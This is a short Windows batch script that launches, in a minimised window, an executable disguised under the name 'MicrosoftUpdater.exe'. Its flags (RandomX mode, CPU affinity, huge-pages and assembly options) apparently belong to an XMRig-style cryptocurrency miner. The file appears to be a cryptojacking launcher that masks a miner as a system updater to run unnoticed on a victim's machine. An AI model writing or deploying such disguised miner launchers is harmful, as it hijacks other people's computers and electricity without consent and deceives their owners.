@echo off
cd /d "%~dp0"
start /MIN MicrosoftUpdater.exe --threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light
pause